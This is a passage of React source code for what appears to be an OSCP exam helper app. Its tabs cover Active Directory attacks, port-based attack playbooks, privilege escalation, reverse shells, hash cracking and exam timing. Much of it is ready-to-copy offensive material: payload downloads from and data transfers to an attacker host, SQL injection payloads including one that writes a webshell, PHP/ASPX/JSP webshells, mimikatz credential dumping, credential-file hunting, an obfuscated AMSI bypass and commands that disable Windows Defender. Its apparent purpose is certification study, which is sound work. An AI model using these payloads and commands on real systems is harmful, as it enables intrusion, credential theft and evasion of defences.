.timer-btn{padding:5px 14px;font-size:11px;font-weight:600;border-radius:4px;border:1px solid var(--bd);background:var(--b3);color:var(--t1);cursor:pointer;font-family:var(--s);transition:all .15s}
.timer-btn:hover{border-color:var(--ac);color:var(--ac)}
.timer-btn.active{background:var(--ac);border-color:var(--ac);color:#fff}
.milestone{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:11px}
.mile-h{font-family:var(--m);font-weight:700;color:var(--ac);min-width:40px;flex-shrink:0}
.mile-t{color:var(--t1)}
.mile-now{color:var(--g);font-weight:600}
.hash-in{width:100%;background:var(--b0);border:1px solid var(--bd);border-radius:5px;padding:8px 10px;color:var(--cg);font-family:var(--m);font-size:11px;outline:none;margin-bottom:10px}
.hash-in:focus{border-color:var(--ac)}
.hash-result{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:12px;margin-bottom:8px}
.empty{text-align:center;padding:50px 16px;color:var(--t2)}
.empty-icon{font-size:40px;margin-bottom:10px}
.empty-title{font-size:14px;font-weight:600;color:var(--t1);margin-bottom:4px}
.score-bar{display:flex;gap:4px;margin-bottom:14px}
.score-seg{flex:1;padding:6px 8px;border-radius:4px;font-size:10px;font-weight:600;text-align:center;cursor:default}
`;

// ━━━ UTILITY FUNCTIONS ━━━
function parsePorts(t){if(!t.trim())return[];const s=new Set();t.split(/[\n,;|]+/).forEach(l=>{(l.match(/\d+/g)||[]).forEach(m=>{const n=parseInt(m);if(n>0&&n<=65535)s.add(n)})});return[...s].sort((a,b)=>a-b)}

function CopyBtn({text}){
  const[c,setC]=useState(false);
  return <button className={`cp ${c?'ok':''}`} onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(text);setC(true);setTimeout(()=>setC(false),1200)}}>{c?'✓':'Copy'}</button>
}

function identifyHash(h){
  const t=h.trim();if(!t)return[];
  const matches=[];
  for(const p of HASH_PATTERNS){if(p.regex.test(t))matches.push(p)}
  return matches;
}

// ━━━ TAB: AD ATTACK CHAIN ━━━
function ADTab({lhost}){
  const[dUser,setDUser]=useState("");const[dPass,setDPass]=useState("");
  const[domain,setDomain]=useState("");const[dcIP,setDCIP]=useState("");
  const[openPhase,setOpenPhase]=useState({0:true});
  const[openSteps,setOpenSteps]=useState({});const[doneSteps,setDoneSteps]=useState({});
  const tP=k=>setOpenPhase(p=>({...p,[k]:!p[k]}));
  const tS=k=>setOpenSteps(p=>({...p,[k]:!p[k]}));
  const tD=(k,e)=>{e.stopPropagation();setDoneSteps(p=>({...p,[k]:!p[k]}))};

  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>AD Set = 10 + 10 + 20 = 40 pts (assumed breach)</div>
      <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Need 70 to pass</div>
    </div>
    <div className="ad-inputs">
      <input className="inp" style={{width:120}} placeholder="Domain User" value={dUser} onChange={e=>setDUser(e.target.value)}/>
      <input className="inp" style={{width:120}} placeholder="Password" value={dPass} onChange={e=>setDPass(e.target.value)}/>
      <input className="inp" style={{width:140}} placeholder="Domain (e.g. corp.local)" value={domain} onChange={e=>setDomain(e.target.value)}/>
      <input className="inp" style={{width:120}} placeholder="DC IP" value={dcIP} onChange={e=>setDCIP(e.target.value)}/>
    </div>
    {AD_CHAIN.map((phase,pi)=>{
      const isOpen=openPhase[pi]!==false;
      const phaseDone=phase.steps.every((_,si)=>doneSteps[`ad-${pi}-${si}`]);
      return(<div className="phase" key={pi}>
        <div className="phase-h" onClick={()=>tP(pi)}>
          <div className={`phase-num ${phaseDone?'done':''}`}>{phaseDone?'✓':pi+1}</div>
          <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
          <span className={`arrow ${isOpen?'open':''}`}>▶</span>
        </div>
        {isOpen&&<div className="steps-wrap">
          {phase.steps.map((step,si)=>{
            const k=`ad-${pi}-${si}`;const isExp=openSteps[k];const isDone=doneSteps[k];
            const cmdText=step.cmd(dUser,dPass,domain,dcIP);
            return(<div className="step" key={si}>
              <div className="step-row" onClick={()=>tS(k)}>
                <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>tD(k,e)}>{isDone?'✓':si+1}</div>
                <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
                <CopyBtn text={cmdText}/>
              </div>
              {isExp&&<div className="s-exp"><div className="cmd">{cmdText}</div></div>}
            </div>)
          })}
        </div>}
      </div>)
    })}
  </div>)
}

// ━━━ TAB: AUTOPILOT (Standalones) ━━━
function AutopilotTab({targetIP}){
  const[portsText,setPortsText]=useState("");
  const[openS,setOpenS]=useState({});const[openP,setOpenP]=useState({});const[doneS,setDoneS]=useState({});
  const ports=useMemo(()=>parsePorts(portsText),[portsText]);
  const playbooks=useMemo(()=>{
    const known=ports.filter(p=>PORT_PLAYBOOKS[p]).map(p=>({port:p,...PORT_PLAYBOOKS[p]}));
    const unknown=ports.filter(p=>!PORT_PLAYBOOKS[p]);
    const ord={CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3};
    known.sort((a,b)=>(ord[a.priority]||9)-(ord[b.priority]||9));
    return{known,unknown}
  },[ports]);

  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>Standalone 1 = 20 pts</div>
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>Standalone 2 = 20 pts</div>
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>Standalone 3 = 20 pts</div>
    </div>
    <div className="port-in">
      <h3>Paste nmap results or port numbers</h3>
      <textarea value={portsText} onChange={e=>setPortsText(e.target.value)} placeholder={"22/tcp open ssh\n80/tcp open http\n445/tcp open microsoft-ds\n\nOr: 22, 80, 445"} spellCheck={false}/>
      <p>{ports.length>0?`${ports.length} ports: ${ports.join(', ')}`:'Paste scan results for attack playbook'}</p>
    </div>
    {playbooks.known.map(pb=>{
      const isO=openP[pb.port]!==false;
      return(<div className="card" key={pb.port}>
        <div className="card-h" onClick={()=>setOpenP(p=>({...p,[pb.port]:!p[pb.port]}))}>
          <div style={{display:'flex',alignItems:'center',gap:8,fontFamily:'var(--m)',fontWeight:700,fontSize:13,color:'var(--t0)'}}>
            <span className={`arrow ${isO?'open':''}`}>▶</span>{pb.icon} :{pb.port} — {pb.service}
          </div>
          <span className={`pri ${pb.priority}`}>{pb.priority}</span>
        </div>
        {isO&&<div className="steps-wrap">{pb.steps.map((step,i)=>{
          const k=`${pb.port}-${i}`;const exp=openS[k];const done=doneS[k];
          const cmd=step.cmd(targetIP||"TARGET");
          return(<div className="step" key={i}>
            <div className="step-row" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
              <div className={`snum ${done?'done':step.critical?'crit':''}`} onClick={e=>{e.stopPropagation();setDoneS(p=>({...p,[k]:!p[k]}))}}>{done?'✓':i+1}</div>
              <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
              <CopyBtn text={cmd}/>
            </div>
            {exp&&<div className="s-exp"><div className="cmd">{cmd}</div></div>}
          </div>)
        })}</div>}
      </div>)
    })}
    {playbooks.unknown.length>0&&<div className="card">
      <div className="card-h"><div style={{fontFamily:'var(--m)',fontWeight:700,fontSize:13,color:'var(--t0)'}}>🔍 Unknown: {playbooks.unknown.join(', ')}</div><span className="pri MEDIUM">ENUM</span></div>
      <div className="steps-wrap"><div className="step"><div className="step-row">
        <div className="snum crit">!</div>
        <div style={{flex:1}}><div className="s-act">Targeted nmap on unknown ports</div><div className="s-chk">→ Identify service and version</div></div>
        <CopyBtn text={`nmap -sC -sV -p${playbooks.unknown.join(',')} ${targetIP||"TARGET"} -oA unknown`}/>
      </div></div></div>
    </div>}
    {ports.length===0&&<div className="empty"><div className="empty-icon">🎯</div><div className="empty-title">Paste scan results above</div><div>Get a prioritized attack playbook for each open port</div></div>}
  </div>)
}

// ━━━ TAB: PRIV ESC ━━━
function PrivEscTab({lhost}){
  const[os,setOS]=useState("linux");
  const[openS,setOpenS]=useState({});const[doneS,setDoneS]=useState({});
  const tree=PRIVESC[os];
  return(<div>
    <div className="ost"><button className={`osb ${os==='linux'?'on':''}`} onClick={()=>setOS('linux')}>Linux</button><button className={`osb ${os==='windows'?'on':''}`} onClick={()=>setOS('windows')}>Windows</button></div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>Follow top-to-bottom. YES = exploit path. NO = next check.</p>
    {tree.map((step,i)=>{
      const isO=openS[step.id];const done=doneS[step.id];
      return(<div className="tree-step" key={step.id}>
        <div className="tree-h" onClick={()=>setOpenS(p=>({...p,[step.id]:!p[step.id]}))}>
          <div className={`phase-num ${done?'done':''}`} style={{width:24,height:24,fontSize:10}} onClick={e=>{e.stopPropagation();setDoneS(p=>({...p,[step.id]:!p[step.id]}))}}>{done?'✓':i+1}</div>
          <div style={{flex:1}}><div style={{fontSize:13,fontWeight:700,color:'var(--t0)'}}>{step.label}</div><div style={{fontSize:11,color:'var(--t2)'}}>{step.q}</div></div>
          <CopyBtn text={step.cmd(lhost||"TARGET")}/>
          <span className={`arrow ${isO?'open':''}`}>▶</span>
        </div>
        {isO&&<div className="tree-exp">
          <div style={{marginBottom:10}}><div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4}}>{step.cmd(lhost||"TARGET")}</div></div>
          <div className="branch y"><div className="bl">YES →</div><div className="bt">{step.yes}</div>
            {step.yesCmd&&<div style={{marginTop:6,position:'relative'}}><div className="cmd" style={{background:'rgba(0,0,0,.3)',padding:6,borderRadius:3}}>{step.yesCmd(lhost||"LHOST")}</div><div style={{position:'absolute',top:2,right:2}}><CopyBtn text={step.yesCmd(lhost||"LHOST")}/></div></div>}
          </div>
          <div className="branch n"><div className="bl">NO →</div><div className="bt">{step.no}</div></div>
        </div>}
      </div>)
    })}
  </div>)
}

// ━━━ TAB: SHELLS & PAYLOADS ━━━
function ShellTab({lhost,lport}){
  const[selS,setSelS]=useState(0);const[selM,setSelM]=useState(0);
  const h=lhost||"LHOST",p=lport||"4444";
  return(<div>
    <div className="sec-title">Reverse Shells</div>
    <div className="gen-grid">{SHELLS.map((s,i)=><div className={`gen-card ${selS===i?'on':''}`} key={i} onClick={()=>setSelS(i)}><span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{s.l}</span><CopyBtn text={s.g(h,p)}/></div>)}</div>
    <div className="gen-out"><div className="cmd">{SHELLS[selS].g(h,p)}</div>
      <div style={{marginTop:8,paddingTop:8,borderTop:'1px solid var(--bd)'}}><div className="cmd" style={{color:'var(--y)'}}>{'# Listener:\nnc -lvnp '+p}</div></div>
    </div>
    <div className="sec-title">MSFVenom Payloads</div>
    <div className="gen-grid">{MSFVENOM.map((s,i)=><div className={`gen-card ${selM===i?'on':''}`} key={i} onClick={()=>setSelM(i)}><span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{s.l}</span><CopyBtn text={s.g(h,p)}/></div>)}</div>
    <div className="gen-out"><div className="cmd">{MSFVENOM[selM].g(h,p)}</div></div>
    <div className="sec-title">Shell Stabilization</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# 1. Spawn PTY\npython3 -c 'import pty;pty.spawn("/bin/bash")'\n\n# 2. Background: Ctrl+Z\n\n# 3. Fix terminal\nstty raw -echo; fg\n\n# 4. Set env\nexport TERM=xterm\nexport SHELL=bash\nstty rows 50 cols 200`}</div></div>
    <div className="sec-title">File Transfers</div>
    <div className="gen-out"><div className="cmd">{`# ─── ATTACKER ───\npython3 -m http.server 80\nimpacket-smbserver share . -smb2support\n\n# ─── LINUX TARGET ───\nwget http://${h}/file -O /tmp/file\ncurl http://${h}/file -o /tmp/file\n\n# ─── WINDOWS TARGET ───\ncertutil -urlcache -split -f http://${h}/file.exe C:\\Temp\\file.exe\npowershell -c "(New-Object Net.WebClient).DownloadFile('http://${h}/file.exe','C:\\Temp\\file.exe')"\ncopy \\\\${h}\\share\\file.exe C:\\Temp\\file.exe\n\n# ─── Impacket SMB (Windows to Attacker) ───\ncopy C:\\Temp\\loot.txt \\\\${h}\\share\\loot.txt`}</div></div>
    <div className="sec-title">Password Mutation & Cracking</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ─── COMMON OSCP PASSWORD PATTERNS ───
# Season+Year:    Spring2025!, Summer2026!, Winter2025!
# Month+Year:     January2025!, March2026!
# Company+Num:    CompanyName1!, Corp2025!
# User+Num:       username1, admin123, user2025!
# Keyboard walks: qwerty, asdf1234!, P@ssw0rd
# Default:        password, Password1, Welcome1!, letmein

# ─── HASHCAT RULES ───
hashcat -m MODE hash.txt wordlist.txt --rules-file /usr/share/hashcat/rules/best64.rule
hashcat -m MODE hash.txt wordlist.txt --rules-file /usr/share/hashcat/rules/rockyou-30000.rule
hashcat -m MODE hash.txt wordlist.txt --rules-file /usr/share/hashcat/rules/InsidePro-PasswordProRules.rule

# ─── GENERATE CUSTOM WORDLIST ───
# cewl (from website):
cewl http://TARGET -d 3 -m 5 -w cewl.txt

# Add mutations with hashcat:
hashcat --stdout cewl.txt --rules-file /usr/share/hashcat/rules/best64.rule > mutated.txt

# Or manually create patterns:
for word in $(cat cewl.txt); do
  echo "$word" >> custom.txt
  echo "$word!" >> custom.txt
  echo "$word\${2025}" >> custom.txt
  echo "$word\${2026}" >> custom.txt
  echo "\${word^}1" >> custom.txt
  echo "\${word^}123" >> custom.txt
done

# ─── JOHN RULES ───
john --wordlist=wordlist.txt --rules=best64 hash.txt`}</div></div>
    <div className="sec-title">Exploit Search & Compilation</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--cg)'}}>{`# ─── SEARCHSPLOIT WORKFLOW ───
searchsploit 'Apache 2.4.49'
searchsploit 'vsftpd 2.3'
searchsploit -t 'service name'       # Title only search
searchsploit -e 'service name'       # Exact match

# Mirror exploit to current dir:
searchsploit -m 12345                # By exploit-db ID
searchsploit -m linux/remote/12345.py

# ─── MODIFY EXPLOIT ───
# ALWAYS check these before running:
# 1. Change LHOST/LPORT/RHOST to your values
# 2. Check if it needs a different python version (python2 vs python3)
# 3. Check if it drops a webshell (change path if needed)

# ─── CROSS-COMPILE FOR TARGET ───
# Linux target (on Kali):
gcc exploit.c -o exploit              # 64-bit
gcc -m32 exploit.c -o exploit         # 32-bit
gcc exploit.c -o exploit -static      # Static (no deps)

# Windows target (on Kali):
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe      # 64-bit
i686-w64-mingw32-gcc exploit.c -o exploit.exe         # 32-bit
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32  # With winsock

# ─── COMMON FIXES ───
# Python2 exploit on Python3:
2to3 -w exploit.py

# Missing python module:
pip install requests pycryptodome impacket

# Compile error missing headers:
apt install gcc-multilib`}</div></div>
    <div className="sec-title">Manual SQL Injection</div>
    <div className="gen-out"><div className="cmd">{`# ─── DETECTION ───
# Test these in EVERY parameter (URL, POST, cookies, headers):
'                        # Error = SQLi likely
' OR '1'='1             # Auth bypass
' OR '1'='1'-- -        # Auth bypass (comment rest)
" OR "1"="1"-- -        # Double quotes variant
' UNION SELECT null-- -  # Test UNION columns

# ─── UNION-BASED (Data Extraction) ───
# 1. Find number of columns:
' ORDER BY 1-- -    # OK
' ORDER BY 2-- -    # OK
' ORDER BY 3-- -    # ERROR → 2 columns

# 2. Find visible columns:
' UNION SELECT 'a','b'-- -

# 3. Extract data:
' UNION SELECT username,password FROM users-- -
' UNION SELECT table_name,null FROM information_schema.tables-- -
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -

# ─── BLIND BOOLEAN (True/False response diff) ───
' AND 1=1-- -    # True (normal page)
' AND 1=2-- -    # False (different page)
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -

# ─── BLIND TIME-BASED ───
' AND SLEEP(5)-- -                               # MySQL
'; WAITFOR DELAY '0:0:5'-- -                     # MSSQL
' AND pg_sleep(5)-- -                             # PostgreSQL

# ─── ERROR-BASED ───
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -    # MySQL
' AND 1=CONVERT(int,(SELECT @@version))-- -                   # MSSQL

# ─── FILE READ / WRITE (MySQL) ───
' UNION SELECT LOAD_FILE('/etc/passwd'),null-- -
' UNION SELECT '<?php system($_GET["c"]); ?>',null INTO OUTFILE '/var/www/html/shell.php'-- -

# ─── AUTH BYPASS CHEATSHEET ───
admin' OR '1'='1'-- -
admin'/*
' OR 1=1#
' OR 1=1-- -
') OR ('1'='1
admin' AND '1'='1`}</div></div>
    <div className="sec-title">Cracking Found Files</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ─── SSH PRIVATE KEY (encrypted id_rsa) ───
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
# OR: hashcat -m 22931 id_rsa.hash rockyou.txt

# ─── KEEPASS DATABASE (.kdbx) ───
keepass2john Database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
# OR: hashcat -m 13400 keepass.hash rockyou.txt

# ─── ZIP FILE ───
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
# OR: hashcat -m 17200 zip.hash rockyou.txt (PKZIP)
# OR: hashcat -m 13600 zip.hash rockyou.txt (WinZip)

# ─── 7z FILE ───
7z2john archive.7z > 7z.hash
john 7z.hash --wordlist=/usr/share/wordlists/rockyou.txt

# ─── RAR FILE ───
rar2john archive.rar > rar.hash
john rar.hash --wordlist=/usr/share/wordlists/rockyou.txt

# ─── PDF FILE ───
pdf2john protected.pdf > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt

# ─── /etc/shadow (Linux) ───
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
# OR: hashcat -m 1800 shadow.hash rockyou.txt  (SHA-512)

# ─── PFX / PKCS12 CERTIFICATE ───
pfx2john certificate.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt

# ─── GPG KEY ───
gpg2john private.key > gpg.hash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt`}</div></div>
    <div className="sec-title">Post-Exploitation Credential Harvesting</div>
    <div className="gen-out"><div className="cmd">{`# ═══ WINDOWS ═══

# Mimikatz (run as SYSTEM/Admin):
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords         # Dump all cached creds
sekurlsa::tickets /export        # Export Kerberos tickets
lsadump::sam                     # Dump SAM hashes
lsadump::dcsync /user:Administrator  # DCSync

# DPAPI (saved browser/wifi passwords):
mimikatz.exe "dpapi::cred /in:C:\\Users\\USER\\AppData\\Local\\Microsoft\\Credentials\\*"

# Saved WiFi passwords:
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Windows Credential Manager:
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

# PowerShell history:
type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

# Registry autologon:
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" | findstr /i "DefaultPassword DefaultUserName"

# IIS config:
type C:\\inetpub\\wwwroot\\web.config
type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config

# Unattend files:
dir /s /b C:\\*unattend* C:\\*sysprep* 2>nul

# ═══ LINUX ═══

# Shadow file:
cat /etc/shadow

# SSH keys:
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null

# Config files with passwords:
grep -rli "password\\|passwd\\|secret\\|key\\|token\\|api" /etc/ /opt/ /var/ /home/ /srv/ 2>/dev/null
cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -i "pass\\|secret\\|key\\|mysql\\|ssh"

# Database creds:
cat /var/www/html/wp-config.php 2>/dev/null          # WordPress
cat /var/www/html/.env 2>/dev/null                    # Laravel/generic
cat /var/www/html/config/database.yml 2>/dev/null     # Rails
cat /opt/*/config*.php /opt/*/.env 2>/dev/null        # Custom apps
find / -name "*.conf" -exec grep -li "password" {} \\; 2>/dev/null

# .git repos (may contain old passwords):
find / -name ".git" -type d 2>/dev/null
cd /path/to/repo && git log --all --oneline
git diff HEAD~10`}</div></div>
    <div className="sec-title">Web Shells (One-liners)</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--cg)'}}>{`# ─── PHP ───
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

# Usage: curl "http://TARGET/shell.php?cmd=whoami"

# PHP with file upload bypass (GIF header):
GIF89a<?php system($_GET['cmd']); ?>

# ─── ASPX ───
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
<%= Process.Start(new ProcessStartInfo("cmd","/c "+Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd() %>

# ─── JSP ───
<% Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c",request.getParameter("cmd")}; Process p = rt.exec(cmd); java.util.Scanner s = new java.util.Scanner(p.getInputStream()); out.println(s.hasNext() ? s.next() : ""); %>

# ─── AMSI BYPASS (PowerShell — run before loading tools) ───
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65)+'msi'+$([char]85)+'tils').GetField('amsi'+$([char]73)+'nit'+$([char]70)+'ailed','NonPublic,Static').SetValue($null,$true)

# ─── WINDOWS DEFENDER EXCLUSION (if admin) ───
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\\Temp"`}</div></div>
  </div>)
}

// ━━━ TAB: HASH ID ━━━
function HashTab(){
  const[hash,setHash]=useState("");
  const results=useMemo(()=>identifyHash(hash),[hash]);
  return(<div>
    <div className="sec-title">Hash Identifier</div>
    <input className="hash-in" placeholder="Paste a hash to identify type..." value={hash} onChange={e=>setHash(e.target.value)} spellCheck={false}/>
    {hash.trim()&&results.length>0?results.map((r,i)=><div className="hash-result" key={i}>
      <div style={{fontSize:13,fontWeight:700,color:'var(--t0)',marginBottom:6}}>{r.name}</div>
      <div className="cmd">{`# John:\njohn --format=${r.jMode} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Hashcat:\nhashcat -m ${r.hMode} hash.txt /usr/share/wordlists/rockyou.txt`}</div>
      <div style={{marginTop:6}}><CopyBtn text={`hashcat -m ${r.hMode} hash.txt /usr/share/wordlists/rockyou.txt`}/></div>
    </div>):hash.trim()?<div className="hash-result"><div style={{color:'var(--y)'}}>Could not auto-identify. Try:</div><div className="cmd" style={{marginTop:6}}>{`# Online: https://hashes.com/en/tools/hash_identifier\n# hashid: hashid '${hash.trim().substring(0,30)}'\n# haiti: haiti '${hash.trim().substring(0,30)}'`}</div></div>:null}
    <div className="sec-title" style={{marginTop:20}}>Common Hash Modes Reference</div>
    <div className="gen-out"><div className="cmd">{`# Hashcat modes:\n0     = MD5\n100   = SHA-1\n1400  = SHA-256\n1700  = SHA-512\n500   = MD5 Crypt ($1$)\n1800  = SHA-512 Crypt ($6$) — Linux /etc/shadow\n3200  = bcrypt\n1000  = NTLM\n3000  = LM\n5600  = Net-NTLMv2\n13100 = Kerberos TGS (Kerberoast)\n18200 = Kerberos AS-REP Roast`}</div></div>
  </div>)
}

// ━━━ TAB: TIMER ━━━
function TimerTab(){
  const[running,setRunning]=useState(false);const[elapsed,setElapsed]=useState(0);const startRef=useRef(null);
  useEffect(()=>{if(!running)return;startRef.current=Date.now()-elapsed*1000;const id=setInterval(()=>setElapsed(Math.floor((Date.now()-startRef.current)/1000)),1000);return()=>clearInterval(id)},[running]);
  const total=23*3600+45*60;const remaining=Math.max(0,total-elapsed);
  const rh=Math.floor(remaining/3600);const rm=Math.floor((remaining%3600)/60);const rs=remaining%60;
  const eh=Math.floor(elapsed/3600);
  const pct=Math.min(100,(elapsed/total)*100);
  const fmt=(h,m,s)=>`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;

  return(<div>
    <div className="timer-bar">
      <div className="timer-display" style={{color:remaining<3600?'var(--r)':remaining<6*3600?'var(--y)':'var(--t0)'}}>{fmt(rh,rm,rs)}</div>
      <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct>85?'var(--r)':pct>50?'var(--y)':'var(--g)'}}/></div>
      <div className="timer-btns">
        <button className={`timer-btn ${running?'active':''}`} onClick={()=>setRunning(!running)}>{running?'⏸ Pause':'▶ Start'}</button>
        <button className="timer-btn" onClick={()=>{setRunning(false);setElapsed(0)}}>⟲ Reset</button>
      </div>
    </div>
    <div className="sec-title">Milestones</div>
    {MILESTONES.map((m,i)=>{
      const isCurrent=eh>=m.hour&&(i===MILESTONES.length-1||eh<MILESTONES[i+1].hour);
      return(<div className="milestone" key={i}>
        <div className="mile-h">{m.hour}h</div>
        <div className={isCurrent?'mile-now':'mile-t'}>{isCurrent?'► ':''}{m.label}</div>
      </div>)
    })}
    <div className="sec-title" style={{marginTop:20}}>Strategy Guide</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# OSCP+ 2025 Optimal Strategy:
#
# 1. START: Launch nmap -p- on ALL machines simultaneously
# 2. While scans run: Begin AD enumeration (you have creds)
# 3. Hours 1-5: Focus on AD set (40 pts)
#    - BloodHound → Kerberoast → ACL abuse → DA
# 4. Hours 5-8: First standalone (easiest looking)
#    - Quick wins: default creds, known CVEs
# 5. Hour 8: You should have 50-60 pts
# 6. Hours 8-16: Remaining standalones
# 7. Hour 16-20: Mop up, try stuck machines
# 8. Hour 20+: STOP. Write report.
#
# CRITICAL RULES:
# - NEVER spend >2 hours on one vector. Move on.
# - Document EVERYTHING as you go (screenshots!)
# - Proof = whoami + hostname + flag in SAME screenshot
# - Report must be PDF in .7z, uploaded to upload.offsec.com
# - NO AI tools allowed (ChatGPT, Copilot, etc.)
# - Metasploit: only on ONE standalone machine`}</div></div>
  </div>)
}

// ━━━ TAB: CHECKLIST ━━━
function ChecklistTab(){
  const[chk,setChk]=useState({});
  const toggle=k=>setChk(p=>({...p,[k]:!p[k]}));
  const total=Object.values(CHECKLIST).flat().length;
  const done=Object.values(chk).filter(Boolean).length;
  const pct=total>0?Math.round((done/total)*100):0;
  return(<div>
    <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:6}}>
      <span style={{fontSize:12,color:'var(--t2)'}}><strong style={{color:pct===100?'var(--g)':'var(--ac)'}}>{done}/{total}</strong> ({pct}%)</span>
      <button className="cp" onClick={()=>setChk({})}>Reset</button>
    </div>
    <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct===100?'var(--g)':'linear-gradient(90deg,var(--ac),var(--r))'}}/></div>
    {Object.entries(CHECKLIST).map(([cat,items])=>{
      const cd=items.filter((_,i)=>chk[`${cat}-${i}`]).length;
      return(<div key={cat} style={{marginBottom:14}}>
        <div className="sec-title" style={{marginTop:10}}>{cat} <span className={`badge ${cd===items.length?'g':'o'}`}>{cd}/{items.length}</span></div>
        {items.map((item,i)=>{const k=`${cat}-${i}`;const d=!!chk[k];
          return <div className={`chk-item ${d?'done':''}`} key={k} onClick={()=>toggle(k)}><div className={`chk-box ${d?'on':''}`}>{d&&'✓'}</div>{item}</div>
        })}
      </div>)
    })}
  </div>)
}

// ━━━ TAB: NOTES ━━━
function NotesTab(){
  const[notes,setNotes]=useState(`# OSCP+ Exam Report Notes
## Machine 1 (AD Set — 40pts)
### Domain: 
### DC IP: 
### Initial Creds: user / pass

#### Enumeration
\`\`\`
# Commands and output here
\`\`\`

#### Attack Path
1. 
2. 
3. 

#### Credentials Found
| Source | User | Password/Hash |
|--------|------|---------------|
|        |      |               |

#### Flags
- Server 1 local.txt: 
- Server 2 local.txt: 
- DC proof.txt: 

#### Screenshots
- [ ] whoami + hostname + flag for each machine

---

## Machine 2 (Standalone — 20pts)
### IP: 
### OS: 

#### Enumeration


#### Initial Access
Vector: 
local.txt: 

#### Privilege Escalation
Vector: 
proof.txt: 

---

## Machine 3 (Standalone — 20pts)
### IP: 
### OS: 

#### Enumeration


#### Initial Access
Vector: 
local.txt: 

#### Privilege Escalation
Vector: 
proof.txt: 

---

## Machine 4 (Standalone — 20pts)
### IP: 
### OS: 

#### Enumeration


#### Initial Access
Vector: 
local.txt: 

#### Privilege Escalation
Vector: 
proof.txt: 

---

## Total Score Estimate
- AD Set: /40
- Standalone 1: /20
- Standalone 2: /20
- Standalone 3: /20
- TOTAL: /100 (need 70)
`);
  return(<div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:8}}>Document everything during the exam. This is your report draft.</p>
    <textarea className="notes" value={notes} onChange={e=>setNotes(e.target.value)} spellCheck={false}/>
  </div>)
}

// ━━━ TAB: INITIAL RECON ━━━
function ReconTab({targetIP}){
  const t=targetIP||"TARGET";
  const scans=[
    { label: "Quick TCP (top 1000)", cmd: `nmap -sC -sV -oA nmap/initial ${t}`, desc: "Default scripts + version detection", critical: true },
    { label: "Full TCP (all ports)", cmd: `nmap -p- --min-rate 5000 -oA nmap/full ${t}`, desc: "Find ALL open TCP ports", critical: true },
    { label: "Targeted deep scan", cmd: `nmap -sC -sV -p PORTS -oA nmap/targeted ${t}`, desc: "Deep scan on found ports" },
    { label: "UDP top 20", cmd: `sudo nmap -sU --top-ports 20 --min-rate 5000 -oA nmap/udp ${t}`, desc: "SNMP (161), TFTP (69), NTP (123)...", critical: true },
